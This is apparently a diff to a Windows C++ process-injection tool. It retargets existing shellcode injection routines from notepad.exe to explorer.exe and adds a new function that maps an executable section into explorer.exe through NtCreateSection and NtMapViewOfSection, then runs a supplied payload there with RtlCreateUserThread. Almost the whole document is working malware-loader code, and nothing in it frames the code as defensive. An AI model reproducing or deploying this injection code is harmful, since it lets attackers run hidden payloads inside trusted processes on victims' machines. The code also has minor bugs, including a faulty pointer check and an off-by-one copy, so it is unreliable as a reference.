@@ -27,7 +27,7 @@ DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
 }
 
 BOOL ClassicInjection(LPVOID lpAddress, DWORD dwSize) {
-    DWORD ProcessId = GetProcessIdByName(L"notepad.exe");
+    DWORD ProcessId = GetProcessIdByName(L"explorer.exe");
     if (NULL != ProcessId)
     {
         printf("[+] ClassicInjection->FindProcess->%d\n", ProcessId);
@@ -92,7 +92,7 @@ BOOL EarlyBird2(LPVOID lpAddress, DWORD dwSize) {
     DWORD ProcessId = 0;
     LPVOID AllocAddr = NULL;
 
-    ProcessId = GetProcessIdByName(L"notepad.exe");
+    ProcessId = GetProcessIdByName(L"explorer.exe");
     if (NULL != ProcessId)
     {
         printf("[+] EarlyBird2->FindProcess->%d\n", ProcessId);
@@ -326,5 +326,89 @@ BOOL ThreadHijack(LPVOID lpAddress, DWORD dwSize) {
     }
     ResumeThread(pi.hThread);
     printf("[+] ThreadHijack->Success\n");
+    return TRUE;
+}
+
+
+
+
+BOOL NtMapInjection(LPVOID lpAddress, DWORD dwSize)
+{
+//#pragma comment(lib, "ntdll")
+    typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
+    typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+    typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
+    using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
+    using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+    using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
+
+    myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
+    myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
+    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
+    SIZE_T size = 4096;
+    LARGE_INTEGER sectionSize = { size };
+    HANDLE sectionHandle = NULL;
+    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
+
+    if (fNtCreateSection != NULL || fNtMapViewOfSection != NULL || fRtlCreateUserThread != 0)
+    {
+        printf("[+] NtMapInjection->GetAddress->fnish\n");
+    }
+    else {
+        printf("[+] NtMapInjection->GetAddress->false\n");
+        return FALSE;
+    }
+    fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+    if (sectionHandle)
+    {
+        printf("[+] NtMapInjection->NtCreateSection->%d\n", sectionHandle);
+    }
+    else {
+        printf("[+] NtMapInjection->NtCreateSection->false\n");
+        return FALSE;
+    }
+
+    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
+    if (localSectionAddress)
+    {
+        printf("[+] NtMapInjection->NtMapViewOfSection->%d\n", localSectionAddress);
+    }
+    else {
+        printf("[+] NtMapInjection->NtMapViewOfSection->false\n");
+        return FALSE;
+    }
+    DWORD dwProcessId = GetProcessIdByName(L"explorer.exe");
+    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessId);
+
+    if (targetHandle)
+    {
+        printf("[+] NtMapInjection->OpenProcess->%d\n", dwProcessId);
+    }
+    else {
+        printf("[+] NtMapInjection->OpenProcess->false\n");
+        return FALSE;
+    }
+    fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
+    if (remoteSectionAddress)
+    {
+        printf("[+] NtMapInjection->NtMapViewOfSection->%d\n", remoteSectionAddress);
+    }
+    else {
+        printf("[+] NtMapInjection->NtMapViewOfSection->false\n");
+        return FALSE;
+    }
+    memcpy(localSectionAddress, lpAddress, dwSize+1);
+
+    HANDLE targetThreadHandle = NULL;
+    fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
+    if (targetThreadHandle)
+    {
+        printf("[+] NtMapInjection->RtlCreateUserThread->%d\n", targetHandle);
+    }
+    else {
+        printf("[+] NtMapInjection->RtlCreateUserThread->false\n");
+        return FALSE;
+    }
+    printf("[+] NtMapInjection->Success\n");
     return TRUE;
 }
